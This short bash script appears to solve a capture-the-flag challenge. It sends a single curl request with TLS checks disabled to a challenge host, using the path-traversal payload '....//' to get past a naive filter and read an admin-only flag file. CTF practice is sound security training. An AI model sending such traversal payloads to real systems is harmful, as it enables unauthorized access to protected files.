#!/usr/bin/env bash
set -euo pipefail

if [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ]; then
  printf 'Usage: %s [base_url]\n' "$0"
  exit 0
fi

BASE_URL="${1:-https://f19f9d9a2a324f57.chal.ctf.ae}"

curl -k --path-as-is -sS "$BASE_URL/api/profile/....//admin/flag"
printf '\n'
